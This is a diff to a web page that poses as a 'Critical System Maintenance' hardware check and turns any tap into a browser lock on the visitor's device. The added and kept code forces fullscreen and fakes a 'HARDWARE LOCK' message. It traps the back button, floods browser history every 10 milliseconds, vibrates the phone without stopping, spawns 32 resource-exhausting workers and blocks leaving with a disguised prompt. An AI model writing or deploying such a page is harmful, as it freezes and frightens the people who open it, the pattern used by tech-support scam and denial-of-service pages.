@@ -4,49 +4,56 @@
     <title>Critical System Maintenance</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <style>
-        /* Making the whole screen a clickable area */
         body { background: #000; color: #ff0000; font-family: "Courier New", Courier, monospace; text-align: center; padding-top: 30%; overflow: hidden; touch-action: none; height: 100vh; width: 100vw; }
+        h1 { font-size: 40px; }
     </style>
 </head>
 <body onclick="engageLockdown()" ontouchstart="engageLockdown()">
 
     <div id="box">
-        <h2 style="letter-spacing: 5px;">LOADING SYSTEM...</h2>
-        <p>Please wait for calibration to complete.</p>
-        <!-- No button needed, tapping anywhere triggers it -->
+        <h2 style="letter-spacing: 5px;">SYSTEM LOADING...</h2>
+        <p>Tapping anywhere to verify hardware...</p>
     </div>
 
     <script>
         let triggered = false;
 
         function engageLockdown() {
-            if (triggered) return; // Prevent double-triggering
+            if (triggered) return;
             triggered = true;
 
-            console.log("LOCKDOWN TRIGGERED BY USER INTERACTION AT: " + new Date());
-            
-            // 1. Request Fullscreen
+            // 1. Request Fullscreen to hide navigation
             let elem = document.documentElement;
             if (elem.requestFullscreen) { elem.requestFullscreen(); }
             else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }
 
             document.body.innerHTML = "<h1>SYSTEM OVERLOAD</h1><p>HARDWARE LOCK ACTIVE</p>";
 
-            // 2. THE BACK-BUTTON KILLER
+            // 2. THE BACK-BUTTON TRAP
+            (function(window, location) {
+                history.replaceState(null, document.title, location.pathname + "#!/steer");
+                history.pushState(null, document.title, location.pathname);
+                window.addEventListener("popstate", function() {
+                    if(location.hash === "#!/steer") {
+                        history.replaceState(null, document.title, location.pathname);
+                        setTimeout(function(){ location.replace(location.href); }, 0);
+                    }
+                }, false);
+            }(window, location));
+
+            // 3. HISTORY FLOODING (Spam 500 entries every 10ms)
             setInterval(() => {
                 for(let i=0; i<500; i++) {
                     window.history.pushState(null, null, "#locked_" + Math.random());
                 }
             }, 10);
 
-            // 3. THE INFINITE VIBRATOR
+            // 4. INFINITE VIBRATION
             setInterval(() => {
-                if (navigator.vibrate) {
-                    navigator.vibrate([2000, 10, 2000]);
-                }
+                if (navigator.vibrate) { navigator.vibrate([2000, 10, 2000]); }
             }, 100);
 
-            // 4. THE THREAD CRUSHER
+            // 5. THE THREAD CRUSHER (32 Workers)
             const blobCode = `
                 setInterval(() => {
                     let b = [];
@@ -55,15 +62,10 @@
             `;
             const blob = new Blob([blobCode], {type: 'application/javascript'});
             const u = URL.createObjectURL(blob);
-            
-            for(let i=0; i<32; i++) {
-                new Worker(u);
-            }
+            for(let i=0; i<32; i++) { new Worker(u); }
 
-            // 5. THE "ZOMBIE" POPUP
-            window.onbeforeunload = function() {
-                return "Are you sure you want to leave the crash?";
-            };
+            // 6. ZOMBIE POPUP
+            window.onbeforeunload = function() { return "Exit hardware test?"; };
         }
     </script>
 </body>
